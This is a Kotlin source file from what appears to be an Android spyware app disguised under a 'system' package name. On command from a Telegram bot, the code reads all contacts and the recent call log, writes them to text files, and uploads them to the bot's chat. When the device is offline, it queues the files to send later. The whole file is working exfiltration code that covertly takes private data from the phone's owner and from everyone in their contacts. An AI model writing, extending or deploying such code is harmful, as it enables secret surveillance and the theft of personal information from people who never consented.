package com.system.superiormonitor.monitor

import android.content.Context
import android.provider.ContactsContract
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import com.system.superiormonitor.util.LogLevel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object FetchOperations {

    fun executeContactsFetch(context: Context, scope: CoroutineScope, chatId: String, messageId: Long, botToken: String) {
        scope.launch(Dispatchers.IO) {
            val tag = "[FetchContacts]"
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Starting contacts fetch...")
            
            TelegramApi.editMessageText(
                token = botToken,
                chatId = chatId,
                messageId = messageId,
                text = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchInProgressMessage("all contacts"),
                replyMarkup = com.system.superiormonitor.bot.BotMarkups.Core.buildEmptyKeyboard()
            )

            try {
                val contactsList = mutableListOf<String>()
                val cursor = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                )

                cursor?.use {
                    val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                    while (it.moveToNext()) {
                        val name = if (nameIndex >= 0) it.getString(nameIndex) else "Unknown"
                        val number = if (numberIndex >= 0) it.getString(numberIndex) else "Unknown"
                        contactsList.add("Name: $name\nPhone: $number\n------------------------")
                    }
                }

                if (contactsList.isEmpty()) {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag No contacts found.")
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("No contacts found on the device."),
                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildFetchOpsMarkup()
                    )
                    return@launch
                }

                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Found ${contactsList.size} contacts. Generating file...")

                val dir = File(context.getExternalFilesDir(null), "fetchops/contacts")
                if (!dir.exists()) dir.mkdirs()

                val dateFormat = SimpleDateFormat("dd-MM-yyyy_HH-mm", Locale.getDefault())
                val fileName = "Contacts_${dateFormat.format(Date())}.txt"
                val outputFile = File(dir, fileName)

                outputFile.bufferedWriter().use { writer ->
                    writer.write("Device Contacts Backup\n")
                    writer.write("Total Contacts: ${contactsList.size}\n")
                    writer.write("========================\n\n")
                    contactsList.forEach { contact ->
                        writer.write("$contact\n")
                    }
                }

                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchGeneratingMessage()
                )

                if (TelegramApi.isApiReachable(context, botToken)) {
                    val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchSuccessMessage("Contacts", contactsList.size)
                    val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = caption)
                    
                    if (uploaded) {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[SENTMSG] Successfully uploaded Contacts file.")
                        outputFile.delete()
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchCompletedMessage("contacts"),
                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
                        )
                    } else {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram upload failed for Contacts.", LogLevel.ERROR)
                        outputFile.delete()
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Telegram API Upload Failed."),
                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
                        )
                    }
                } else {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Device offline. Moved contacts to offline queue.")
                    com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "fetchops/contacts", fileName)
                }

            } catch (e: Exception) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Exception during Contacts fetch: ${e.message}", LogLevel.ERROR)
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Exception occurred. ${e.message}"),
                    replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
                )
            }
        }
    }

    fun executeCallLogFetch(context: Context, scope: CoroutineScope, limit: Int, chatId: String, messageId: Long, botToken: String) {
        scope.launch(Dispatchers.IO) {
            val tag = "[FetchCalls]"
            LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Starting Call Activity fetch (limit: $limit)...")
            
            TelegramApi.editMessageText(
                token = botToken,
                chatId = chatId,
                messageId = messageId,
                text = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchInProgressMessage("call activity"),
                replyMarkup = com.system.superiormonitor.bot.BotMarkups.Core.buildEmptyKeyboard()
            )

            try {
                val callsList = mutableListOf<String>()
                val uri = android.provider.CallLog.Calls.CONTENT_URI
                val projection = arrayOf(
                    android.provider.CallLog.Calls.TYPE,
                    android.provider.CallLog.Calls.DATE,
                    android.provider.CallLog.Calls.NUMBER,
                    android.provider.CallLog.Calls.CACHED_NAME
                )
                val sortOrder = "${android.provider.CallLog.Calls.DATE} DESC"

                val cursor = context.contentResolver.query(uri, projection, null, null, sortOrder)
                var count = 0

                cursor?.use {
                    val typeIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)
                    val dateIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)
                    val numberIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)
                    val nameIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME)

                    val formatter = SimpleDateFormat("hh:mm a | dd/MM/yyyy", Locale.getDefault())

                    while (it.moveToNext() && count < limit) {
                        val type = it.getInt(typeIdx)
                        val dateInMillis = it.getLong(dateIdx)
                        val number = it.getString(numberIdx) ?: "Unknown"
                        val cachedName = it.getString(nameIdx)
                        val contactName = if (cachedName.isNullOrEmpty()) "Unsaved" else cachedName

                        val typeStr = when (type) {
                            android.provider.CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            android.provider.CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            android.provider.CallLog.Calls.MISSED_TYPE, android.provider.CallLog.Calls.REJECTED_TYPE -> "Missed"
                            else -> "Other"
                        }
                        val timeStr = formatter.format(Date(dateInMillis))

                        callsList.add("Type: $typeStr\nTime: $timeStr\nName: $contactName\nPhone: $number\n------------------------")
                        count++
                    }
                }

                if (callsList.isEmpty()) {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag No calls found.")
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("No call logs found on the device."),
                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
                    )
                    return@launch
                }

                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Found ${callsList.size} calls. Generating file...")

                val dir = File(context.getExternalFilesDir(null), "fetchops/calls")
                if (!dir.exists()) dir.mkdirs()

                val dateFormat = SimpleDateFormat("dd-MM-yyyy_HH-mm", Locale.getDefault())
                val fileName = "CallActivity_${dateFormat.format(Date())}.txt"
                val outputFile = File(dir, fileName)

                outputFile.bufferedWriter().use { writer ->
                    writer.write("Device Call Activity Backup\n")
                    writer.write("Total Calls: ${callsList.size} (Limit: $limit)\n")
                    writer.write("========================\n\n")
                    callsList.forEach { call ->
                        writer.write("$call\n")
                    }
                }

                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchGeneratingMessage()
                )

                if (TelegramApi.isApiReachable(context, botToken)) {
                    val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchSuccessMessage("Call Activity", callsList.size)
                    val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = caption)
                    
                    if (uploaded) {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[SENTMSG] Successfully uploaded Call Activity file.")
                        outputFile.delete()
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchCompletedMessage("call activity"),
                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
                        )
                    } else {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram upload failed for Call Activity.", LogLevel.ERROR)
                        outputFile.delete()
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Telegram API Upload Failed."),
                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
                        )
                    }
                } else {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Device offline. Moved call activity to offline queue.")
                    com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "fetchops/calls", fileName)
                }

            } catch (e: Exception) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Exception during Call Activity fetch: ${e.message}", LogLevel.ERROR)
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Exception occurred. ${e.message}"),
                    replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
                )
            }
        }
    }
}
